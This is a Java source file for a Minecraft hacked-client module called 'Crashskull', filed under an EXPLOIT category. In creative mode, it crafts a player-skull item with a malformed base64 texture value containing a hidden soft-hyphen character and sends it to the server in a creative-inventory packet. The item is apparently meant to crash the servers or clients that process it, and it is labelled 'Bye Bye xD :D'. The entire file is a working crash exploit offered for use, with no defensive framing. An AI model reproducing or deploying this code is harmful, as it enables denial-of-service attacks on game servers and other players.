package me.bratwurst.module.modules.Crasher;

import com.mojang.authlib.GameProfile;
import com.mojang.authlib.properties.Property;
import me.bratwurst.event.EventTarget;
import me.bratwurst.event.events.EventMotionUpdate;
import me.bratwurst.module.Category;
import me.bratwurst.module.Module;
import me.bratwurst.utils.player.PlayerUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTUtil;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.util.EnumChatFormatting;

import java.util.UUID;

public class Crashskull extends Module {
    public Crashskull() {
        super("Crashskull", Category.EXPLOIT);
    }

    @EventTarget
    public void onUpdate(EventMotionUpdate e) {

    }

    @Override
    public void onEnable() {
        super.onEnable();
        if (!mc.thePlayer.capabilities.isCreativeMode) {
            PlayerUtils.sendMessage(EnumChatFormatting.AQUA + "Das funktioniert nur im Creativemode.");

        } else if (mc.thePlayer.inventory.getStackInSlot(0) != null) {
            PlayerUtils.sendMessage(EnumChatFormatting.AQUA + "Bitte halte denn ersten Slot frei.");

        } else {
            ItemStack item = new ItemStack(Items.skull, 1, 3);
            NBTTagCompound nbt = new NBTTagCompound();
            NBTTagCompound c = new NBTTagCompound();
            GameProfile prof = new GameProfile((UUID) null, this.name);
            prof.getProperties().put("textures", new Property("Value", "eyJ0ZXh0\u00addXJlcyI6eyJTS0lOIjp7InVybCI6IiJ9fX0="));
            c.setString("Id", "9d744c33-f3c4-4040-a7fc-73b47c840f0c");
            NBTUtil.writeGameProfile(c, prof);
            nbt.setTag("SkullOwner", c);
            nbt.setBoolean("crash", true);
            item.stackTagCompound = nbt;
            item.setStackDisplayName("Bye Bye xD :D ");
            mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, item));
          toggle();
        }
    }
}